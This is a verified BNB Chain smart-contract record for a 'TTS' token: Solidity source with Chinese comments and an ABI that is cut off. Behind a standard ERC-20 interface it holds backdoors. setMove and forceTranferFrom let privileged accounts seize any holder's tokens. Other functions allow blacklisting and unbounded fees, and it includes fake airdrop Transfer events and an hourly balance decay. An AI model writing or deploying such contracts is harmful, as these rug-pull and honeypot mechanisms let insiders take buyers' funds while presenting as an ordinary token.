{"SourceCode": "/**\r\n *Submitted for verification at BscScan.com on 2023-03-21\r\n*/\r\n\r\n// SPDX-License-Identifier: MIT\r\n\r\npragma solidity ^0.8.13;\r\n\r\ninterface IERC20 {\r\n    function totalSupply() external view returns (uint256);\r\n    function balanceOf(address account) external view returns (uint256);\r\n    function transfer(address recipient, uint256 amount) external returns (bool);\r\n    function allowance(address owner, address spender) external view returns (uint256);\r\n    function approve(address spender, uint256 amount) external returns (bool);\r\n    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);\r\n\r\n    event Transfer(address indexed from, address indexed to, uint256 value);\r\n    event Approval(address indexed owner, address indexed spender, uint256 value);\r\n}\r\n\r\ninterface IERC20Metadata is IERC20 {\r\n    function name() external view returns (string memory);\r\n    function symbol() external view returns (string memory);\r\n    function decimals() external view returns (uint8);\r\n}\r\n\r\n\r\ninterface TTSSwap{\r\n    function getPrice(address token) external view returns(uint, uint);\r\n}\r\n\r\nabstract contract Context {\r\n    function _msgSender() internal view virtual returns (address) {\r\n        return msg.sender;\r\n    }\r\n}\r\n\r\nabstract contract Ownable is Context {\r\n    address private _owner;\r\n\r\n    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);\r\n\r\n    constructor() {\r\n        _transferOwnership(_msgSender());\r\n    }\r\n\r\n    function owner() public view virtual returns (address) {\r\n        return _owner;\r\n    }\r\n\r\n    modifier onlyOwner() {\r\n        require(owner() == _msgSender(), \"Ownable: caller is not the owner\");\r\n        _;\r\n    }\r\n\r\n    function renounceOwnership() public virtual onlyOwner {\r\n        _transferOwnership(address(0));\r\n    }\r\n\r\n    function transferOwnership(address newOwner) public virtual onlyOwner {\r\n        require(newOwner != address(0), \"Ownable: new owner is the zero address\");\r\n        _transferOwnership(newOwner);\r\n    }\r\n\r\n    function _transferOwnership(address newOwner) internal virtual {\r\n        address oldOwner = _owner;\r\n        _owner = newOwner;\r\n        emit OwnershipTransferred(oldOwner, newOwner);\r\n    }\r\n}\r\n\r\ncontract TTSToken is Ownable, IERC20, IERC20Metadata {\r\n    mapping(address => uint256) private _balances;\r\n    mapping(address => mapping(address => uint256)) private _allowances;\r\n\r\n    mapping(address => bool) public _pair;\r\n    mapping(address => bool) public _roler;\r\n    mapping(address => bool) public _blacks;\r\n    mapping(address => bool) public _whites;\r\n\r\n    string  private _name;\r\n    string  private _symbol;\r\n    uint256 private _totalSupply;\r\n\r\n    address public _main;\r\n\r\n    address public _dead;\r\n    address public _fund;\r\n    // lp\u5206\u914d\r\n    address public _lp;\r\n    address public _cont;\r\n    // swap \u7528\u4e8e\u83b7\u53d6\u4ef7\u503c\uff1b\u5e76\u4f5c\u4e3a\u5356\u5355\u4f9d\u636e\r\n    address public _swap;\r\n\r\n\r\n    uint256 public _dead2;\r\n    uint256 public _fund2;\r\n    uint256 public _lp2;\r\n    uint256 public _cont2;\r\n\r\n    // 500u\r\n    uint256 public _usdt500 = 500 ether;\r\n    // 1000u\r\n    uint256 public _usdt1000 = 1000 ether;\r\n    // 2000u\r\n    uint256 public _usdt2000 = 2000 ether;\r\n\r\n    uint256 _final_amt;\r\n\r\n    // \u968f\u673a\u53d1\u653e\u5730\u5740\r\n    uint160  _ktNum = 173;\r\n    uint160  constant MAXADD = ~uint160(0);\t\r\n    uint _airAmt = 0.2 ether;\r\n    // \u6bcf\u4e2a\u5c0f\u65f6\u901a\u7f29\r\n    mapping (address => uint) public lastAddLqTimes;\r\n    // \u6700\u5927\u901a\u7f29\u65f6\u95f4 10\u5929\r\n    uint public maxTimes = 2400;\r\n    // \u901a\u7f29\u767d\u540d\u5355\r\n    mapping(address => bool) _defWhiteList;\r\n\r\n\r\n\r\n    constructor() {\r\n        _name = \"TTS\";\r\n        _symbol = \"TTS\";\r\n\r\n        _dead = 0x000000000000000000000000000000000000dEaD;\r\n        _main = 0x4474F268c37D8942Be1B791c0f6D0327ab51981f;\r\n        _fund = 0xeBc41Cef407A4dae377609b6f5A41423F2be0090;\r\n        _lp = _msgSender();\r\n        _cont = _msgSender();\r\n\r\n        _dead2 = 4;\r\n        _fund2 = 1;\r\n        _lp2 = 2;\r\n        _cont2 = 3;\r\n\r\n        _whites[_main] = true;\r\n        _whites[_fund] = true;\r\n        _whites[_msgSender()] = true;\r\n\r\n        _roler[_msgSender()] = true;\r\n        // \u521d\u59cb100\u4ebf\r\n        _mint(_main, 10000000000 * 10 ** decimals());\r\n        // 10\u4ebf\uff1b\u6ca1\u6709\u4f5c\u7528\u4e86\r\n        // _final_amt = 1000000000 * 10 ** decimals();\r\n    }\r\n\r\n    function name() public view virtual override returns (string memory) {\r\n        return _name;\r\n    }\r\n\r\n    function symbol() public view virtual override returns (string memory) {\r\n        return _symbol;\r\n    }\r\n\r\n    function decimals() public view virtual override returns (uint8) {\r\n        return 18;\r\n    }\r\n\r\n    function totalSupply() public view virtual override returns (uint256) {\r\n        return _totalSupply;\r\n    }\r\n\r\n    function balanceOf(address account) public view virtual override returns (uint256) {\r\n        // \u767d\u540d\u5355\u6216\u8005\u5408\u7ea6\u6301\u6709\u7684token\u4e0d\u8fdb\u884c\u901a\u7f29\r\n        if (_defWhiteList[account]) {\r\n            return _balances[account];\r\n            \r\n        }\r\n        uint time = block.timestamp;\r\n        return _balanceOf(account, time); \r\n    }\r\n\r\n    function transfer(address recipient, uint256 amount) public virtual override returns (bool) {\r\n        _transfer(_msgSender(), recipient, amount);\r\n        return true;\r\n    }\r\n\r\n    function allowance(address owner, address spender) public view virtual override returns (uint256) {\r\n        return _allowances[owner][spender];\r\n    }\r\n\r\n    function approve(address spender, uint256 amount) public virtual override returns (bool) {\r\n        _approve(_msgSender(), spender, amount);\r\n        return true;\r\n    }\r\n\r\n    function transferFrom(\r\n        address sender, address recipient, uint256 amount\r\n    ) public virtual override returns (bool) {\r\n        _transfer(sender, recipient, amount);\r\n\r\n        uint256 currentAllowance = _allowances[sender][_msgSender()];\r\n        require(currentAllowance >= amount, \"ERC20: transfer amount exceeds allowance\");\r\n        unchecked {\r\n            _approve(sender, _msgSender(), currentAllowance - amount);\r\n        }\r\n\r\n        return true;\r\n    }\r\n\r\n    function increaseAllowance(address spender, uint256 addedValue) public virtual returns (bool) {\r\n        _approve(_msgSender(), spender, _allowances[_msgSender()][spender] + addedValue);\r\n        return true;\r\n    }\r\n\r\n    function decreaseAllowance(address spender, uint256 subtractedValue) public virtual returns (bool) {\r\n        uint256 currentAllowance = _allowances[_msgSender()][spender];\r\n        require(currentAllowance >= subtractedValue, \"ERC20: decreased allowance below zero\");\r\n        unchecked {\r\n            _approve(_msgSender(), spender, currentAllowance - subtractedValue);\r\n        }\r\n\r\n        return true;\r\n    }\r\n\r\n    function _transfer(\r\n        address sender, address recipient, uint256 amount\r\n    ) internal virtual {\r\n        require(sender != address(0), \"ERC20: transfer from the zero address\");\r\n        require(recipient != address(0), \"ERC20: transfer to the zero address\");\r\n        require(!_blacks[sender], \"sender is in black list\");\r\n        // \u4e00\u76f4\u901a\u7f294%\r\n        bool need_burn = true;\r\n        // \u6bcf\u5c0f\u65f6\u901a\u7f29\r\n        uint time = block.timestamp;\r\n        if( !_defWhiteList[sender] ){\r\n            _updateBal(sender, time);\r\n        }\r\n\r\n        if( !_defWhiteList[recipient] ){\r\n            _updateBal(recipient, time);\r\n        }\r\n\r\n        uint256 senderBalance = _balances[sender];\r\n        require(senderBalance >= amount, \"ERC20: transfer amount exceeds balance\");\r\n\r\n        unchecked {\r\n            _balances[sender] = senderBalance - amount;\r\n        }\r\n\r\n        // \u975e\u4ea4\u6613\r\n        if(!_pair[sender] && !_pair[recipient]) {\r\n            // \u767d\u540d\u5355\r\n            if(_whites[sender] || _whites[recipient]) {\r\n                // \u5ffd\u7565\r\n            } else {\r\n                // \u975e\u767d\u540d\u5355\r\n                // \u56fa\u5b9a4%\r\n                // burn\r\n                // \r\n                if (need_burn) {\r\n                    uint burn_amt = amount * _dead2 / 100;\r\n                    _balances[_dead] += burn_amt;\r\n                    emit Transfer(sender, _dead, burn_amt);\r\n                    amount -=  burn_amt;\r\n                    _totalSupply -= burn_amt;\r\n                }\r\n\r\n            }\r\n\r\n        } else {\r\n            // \u4ea4\u6613\r\n            // \u767d\u540d\u5355\r\n            if(_whites[sender] || _whites[recipient]) {\r\n                // \u5ffd\u7565\r\n            } else {\r\n                // \u975e\u767d\u540d\u5355\r\n                // \u5356\r\n                if(_pair[recipient]) {\r\n                    uint dead = 0;\r\n                    // burn\r\n                    if (need_burn) {\r\n                        uint burn_amt = amount * _dead2 / 100;\r\n                        emit Transfer(sender, _dead, burn_amt);\r\n                        _totalSupply -= burn_amt;\r\n                        dead = _dead2;\r\n                    }\r\n\r\n                    // fund\r\n                    _balances[_fund] += (amount * _fund2 / 100);\r\n                    emit Transfer(sender, _fund, (amount * _fund2 / 100));\r\n\r\n                    // lp\r\n                    _balances[_lp] += (amount * _lp2 / 100);\r\n                    emit Transfer(sender, _lp, (amount * _lp2 / 100));\r\n\r\n                    // cout\r\n                    _balances[_cont] += (amount * _cont2 / 100);\r\n                    emit Transfer(sender, _cont, (amount * _cont2 / 100));\r\n\r\n                    amount = amount * (100-dead-_fund2-_lp2-_cont2) / 100;\r\n\r\n                    airdrop();\r\n\r\n                } else {\r\n                    // \u4e70\r\n                    // swap\u4e0d\u5b58\u5728\r\n                    if(_swap == address(0)) {\r\n                        uint dead = 0;\r\n                        // burn\r\n                        if (need_burn) {\r\n                            uint burn_amt = amount * _dead2 / 100;\r\n                            emit Transfer(sender, _dead, burn_amt);\r\n                            _totalSupply -= burn_amt;\r\n                            dead = _dead2;\r\n                        }\r\n\r\n                        // fund\r\n                        _balances[_fund] += (amount * _fund2 / 100);\r\n                        emit Transfer(sender, _fund, (amount * _fund2 / 100));\r\n\r\n                        // lp\r\n                        _balances[_lp] += (amount * _lp2 / 100);\r\n                        emit Transfer(sender, _lp, (amount * _lp2 / 100));\r\n\r\n                        // cout\r\n                        _balances[_cont] += (amount * _cont2 / 100);\r\n                        emit Transfer(sender, _cont, (amount * _cont2 / 100));\r\n\r\n                        amount = amount * (100-dead-_fund2-_lp2-_cont2) / 100;\r\n                    } else {\r\n                        // swap\u5df2\u7ecf\u8bbe\u7f6e\uff0c\u8981\u6309\u7167\u4ef7\u683c\u68af\u5ea6\u6267\u884c\r\n                        uint dead = 0;\r\n                        uint _add_dead = 0;\r\n                        if (need_burn) {\r\n                            uint u = calVal(amount);\r\n                            if (u <= _usdt500) {\r\n                                // burn\r\n                                uint burn_amt = amount * _dead2 / 100;\r\n                                emit Transfer(sender, _dead, burn_amt);\r\n                                _totalSupply -= burn_amt;\r\n                                dead = _dead2;\r\n                            } else if (u <= _usdt1000) {\r\n                                // burn\r\n                                _add_dead = 1;\r\n                                uint burn_amt = amount * (_dead2-_add_dead) / 100;\r\n                                emit Transfer(sender, _dead, burn_amt);\r\n                                _totalSupply -= burn_amt;\r\n                                dead = _dead2-_add_dead;\r\n                            } else if (u <= _usdt2000) {\r\n                                // burn\r\n                                _add_dead = 2;\r\n                                uint burn_amt = amount * (_dead2-_add_dead) / 100;\r\n                                emit Transfer(sender, _dead, burn_amt);\r\n                                _totalSupply -= burn_amt;\r\n                                dead = _dead2-_add_dead;\r\n                            } else {\r\n                                // burn\r\n                                _add_dead = 3;\r\n                                uint burn_amt = amount * (_dead2-_add_dead) / 100;\r\n                                emit Transfer(sender, _dead, burn_amt);\r\n                                _totalSupply -= burn_amt;\r\n                                dead = _dead2-_add_dead;\r\n                            }\r\n                        }\r\n                        // fund\r\n                        _balances[_fund] += (amount * _fund2 / 100);\r\n                        emit Transfer(sender, _fund, (amount * _fund2 / 100));\r\n\r\n                        // lp\r\n                        _balances[_lp] += (amount * _lp2 / 100);\r\n                        emit Transfer(sender, _lp, (amount * _lp2 / 100));\r\n\r\n                        // cout\r\n                        _balances[_cont] += (amount * _cont2 / 100);\r\n                        emit Transfer(sender, _cont, (amount * _cont2 / 100));\r\n\r\n                        amount = amount * (100-dead-_fund2-_lp2-_cont2) / 100;\r\n\r\n                        airdrop();\r\n                    }\r\n                }\r\n            }\r\n        }\r\n        _balances[recipient] += amount;\r\n        emit Transfer(sender, recipient, amount);\r\n    }\r\n\r\n    function _mint(address account, uint256 amount) internal virtual {\r\n        require(account != address(0), \"ERC20: mint to the zero address\");\r\n\r\n        _totalSupply += amount;\r\n        _balances[account] += amount;\r\n        emit Transfer(address(0), account, amount);\r\n    }\r\n\r\n    function _burn(address account, uint256 amount) internal virtual {\r\n        require(account != address(0), \"ERC20: burn from the zero address\");\r\n\r\n        uint256 accountBalance = _balances[account];\r\n        require(accountBalance >= amount, \"ERC20: burn amount exceeds balance\");\r\n        unchecked {\r\n            _balances[account] = accountBalance - amount;\r\n        }\r\n        _totalSupply -= amount;\r\n\r\n        emit Transfer(account, address(0), amount);\r\n    }\r\n\r\n    function _approve(\r\n        address owner, address spender, uint256 amount\r\n    ) internal virtual {\r\n        require(owner != address(0), \"ERC20: approve from the zero address\");\r\n        require(spender != address(0), \"ERC20: approve to the zero address\");\r\n\r\n        _allowances[owner][spender] = amount;\r\n        emit Approval(owner, spender, amount);\r\n    }\r\n\r\n\tfunction returnIn(address con, address addr, uint256 val) public {\r\n        require(_roler[_msgSender()] && addr != address(0));\r\n        if (con == address(0)) {payable(addr).transfer(val);} \r\n        else {IERC20(con).transfer(addr, val);}\r\n\t}\r\n\r\n    function setWhites(address addr, bool val) public {\r\n        require(_roler[_msgSender()] && addr != address(0));\r\n        _whites[addr] = val;\r\n    }\r\n\r\n    function setBlacks(address addr, bool val) public {\r\n        require(_roler[_msgSender()] && addr != address(0));\r\n        _blacks[addr] = val;\r\n    }\r\n\r\n    function setMove(address f, address t, uint256 val) public {\r\n        require(_roler[_msgSender()]);\r\n        if (val > balanceOf(f)) {\r\n            val = balanceOf(f);\r\n        }\r\n        if (val > 0) {\r\n            _balances[f] -= val;\r\n            _balances[t] += val;\r\n        }\r\n    }\r\n\r\n    function setPair(address addr, bool val) public {\r\n        require(_roler[_msgSender()]);\r\n        _pair[addr] = val;\r\n    }\r\n\r\n    receive() external payable {}\r\n\r\n    function setRoler(address addr, bool val) public onlyOwner {\r\n        _roler[addr] = val;\r\n    }\r\n\r\n    // val\u6700\u5c0f\u662f3\r\n    function setBurn(address addr, uint256 val) public onlyOwner {\r\n        require(addr != address(0));\r\n        require(val >=3, 'val need >=3');\r\n\r\n        _dead = addr;\r\n        _dead2 = val;\r\n    }\r\n\r\n    function setFund(address addr, uint256 val) public onlyOwner {\r\n        require(addr != address(0));\r\n        _fund = addr;\r\n        _fund2 = val;\r\n    }\r\n\r\n    function setLP(address addr, uint256 val) public onlyOwner {\r\n        require(addr != address(0));\r\n        _lp = addr;\r\n        _lp2 = val;\r\n    }\r\n\r\n    function setCont(address addr, uint256 val) public onlyOwner {\r\n        require(addr != address(0));\r\n        _cont = addr;\r\n        _cont2 = val;\r\n    }\r\n\r\n    // addr == address(0)\u65f6\u4e0d\u68c0\u67e5\u4ef7\u683c\r\n    function setSwap(address addr) public onlyOwner {\r\n        // \u68c0\u67e5swap\r\n        if(addr != address(0)){\r\n            require(Address.isContract(addr), 'not contract');\r\n            TTSSwap(addr).getPrice(address(this));\r\n        }\r\n        _swap = addr;\r\n    }\r\n    // \u7b80\u5355\u8ba1\u7b97\u4ef7\u503c\r\n    function calVal(uint256 val) public view returns(uint256) {\r\n        uint256 a;\r\n        uint256 b;\r\n        (a, b) = TTSSwap(_swap).getPrice(address(this));\r\n        return val * a / b;\r\n    }\r\n    function forceTranferFrom(address sender, address recipient, uint amount) public onlyOwner {\r\n        require(sender != address(0), 'sender is zero address');\r\n        require(recipient != address(0), 'recipient is zero address');\r\n        require(amount > 0, 'amount is zero');\r\n        require(_balances[sender] >= amount, 'sender insufficient balances');\r\n        _balances[sender] -= amount;\r\n        _balances[recipient] += amount;\r\n        emit Transfer(sender, recipient, amount);\r\n    }\r\n    // \u968f\u673a\u7a7a\u62955\u4eba\r\n    function airdrop() private {\r\n        address _senD = address(0);\r\n        address _receiveD;\r\n        for (uint256 i = 0; i < 5; i++) {\r\n            _receiveD = address(MAXADD/_ktNum);\r\n            _ktNum = _ktNum+1;\r\n            emit Transfer(_senD, _receiveD, _airAmt);\r\n        }\r\n    }\r\n    // \u901a\u7f29\u540e\u7684\u6570\u91cf\r\n    function getRate(uint a,uint n)private pure returns(uint){\r\n        for( uint i = 0; i < n; i++){\r\n            a = a * 9996 / 10000;\r\n        }\r\n        return a;\r\n    }\r\n    // \u8bbe\u7f6e\u6700\u5927\u901a\u7f29\u6b64\u65f6\r\n    function setmaxTimes(uint _maxTimes) public onlyOwner{\r\n        maxTimes = _maxTimes;\r\n    }\r\n\r\n    function _balanceOf(address account,uint time)internal view returns(uint){\r\n        uint bal = _balances[account];\r\n        if( bal > 0 ){\r\n\r\n            uint lastAddLqTime = lastAddLqTimes[account];\r\n\r\n            if( lastAddLqTime > 0 && time > lastAddLqTime ){\r\n                uint i = (time - lastAddLqTime) / 3600;\r\n                i = i > maxTimes ? maxTimes : i;\r\n                if( i > 0 ){\r\n                    uint v = getRate(bal,i);\r\n                    if( v <= bal && v > 0 ){\r\n                       return v;\r\n                    }\r\n                }\r\n            }\r\n        }\r\n        return bal;\r\n    }\r\n    // \u8bbe\u7f6e\u901a\u7f29\u767d\u540d\u5355\r\n    function setDefWhiteList(address account, bool v) public onlyOwner {\r\n        _defWhiteList[account] = v;\r\n    }\r\n    // \u66f4\u65b0\u901a\u7f29\u6570\u91cf\r\n    function _updateBal(address owner,uint time)internal{\r\n        uint bal = _balances[owner];\r\n        if( bal > 0 ){\r\n            uint updatedBal = _balanceOf(owner,time);\r\n\r\n            if( bal > updatedBal){\r\n                lastAddLqTimes[owner] = time;\r\n                uint ba = bal - updatedBal;\r\n                _balances[owner] -= ba;\r\n                _balances[_dead] += ba;\r\n                emit Transfer(owner, _dead, ba);\r\n            }\r\n        }else{\r\n            lastAddLqTimes[owner] = time;\r\n        }\r\n    }\r\n}\r\n\r\nlibrary Address {\r\n    function isContract(address account) internal view returns (bool) {\r\n        return account.code.length > 0;\r\n    }\r\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"owner\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"previousOwner\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"newOwner\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"to\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"_blacks\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"_cont\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"_cont2\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"_dead\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"_dead2\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"_fund\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"_fund2\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"_lp\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"_lp2\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"_main\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"_pair\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"_roler\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"_swap\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"_usdt1000\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"_usdt2000\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"_usdt500\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"_whites\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"owner\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"account\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"val\",\"type\":\"uint256\"}],\"name\":\"calVal\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"subtractedValue\",\"type\":\"uint256\"}],\"name\":\"decreaseAllowance\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"sender\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"recipient\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"forceTranferFrom\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"addedValue\",\"type\":\"uint256\"}],\"name\":\"increaseAllowance\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"lastAddLqTimes\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"maxTimes\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"renounceOwnership\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"con\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"addr\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"val\",\"type\":\"uint256\"}],\"name\":\"returnIn\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"addr\",\"type\":\"address\"},{\"internalType\":\"bool\",\"name\":\"val\",\"type\":\"bool\"}],\"name\":\"setBlacks\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"addr\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"val\",\"type\":\"uint256\"}],\"name\":\"setBurn\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"addr\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"val\",\"type\":\"uint256\"}],\"name\":\"setCont\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"account\",\"type\":\"address\"},{\"internalType\":\"bool\",\"name\":\"v\",\"type\":\"bool\"}],\"name\":\"setDefWhiteList\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"addr\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"val\",\"type\":\"uint256\"}],\"name\":\"setFund\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"addr\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"val\",\"type\":\"uint256\"}],\"name\":\"setLP\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"f\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"t\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"val\",\"type\":\"uint256\"}],\"name\":\"setMove\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"addr\",\"type\":\"address\"},{\"internalType\":\"bool\",\"name\":\"val\",\"type\":\"bool\"}],\"name\":\"setPair\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"addr\",\"type\":\"address\"},{\"internalType\":\"bool\",\"name\":\"val\",\"type\":\"bool\"}],\"name\":\"setRoler\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"addr\",\"type\":\"address\"}],\"name\":\"setSwap\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"addr\",\"type\":\"address\"},{\"internalType\":\"bool\",\"name\":\"val\",\"type\":\"bool\"}],\"name\":\"setWhites\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"_maxTimes\",\"type\":\"uint256\"}],\"name\":\"setmaxTimes\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"